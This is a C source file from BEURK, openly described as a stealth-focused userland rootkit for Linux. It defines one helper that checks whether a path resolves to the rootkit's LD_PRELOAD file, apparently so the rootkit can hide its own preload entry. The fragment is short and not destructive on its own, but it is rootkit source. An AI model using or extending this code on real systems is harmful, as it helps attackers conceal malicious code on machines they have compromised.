/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <limits.h> /* PATH_MAX */
#include <stdlib.h> /* realpath(), free()*/
#include <string.h> /* strcmp() */
#include "beurk.h" /* prototype */
#include "config.h" /* FILE, MAX_LEN, MAGIC_STRING, LIBRARY_NAME, ... */
#include "debug.h" /* DEBUG() */


int         is_ld_preload_file(const char *file) {
    init();
    DEBUG(D_INFO, "called is_ld_preload_file()");

    char    *path;
    int     ret;

    path = realpath(file, NULL);
    if (path == NULL)
        return 0;
    ret = !strcmp(path, LD_PRELOAD);
    free(path);
    return ret;
}
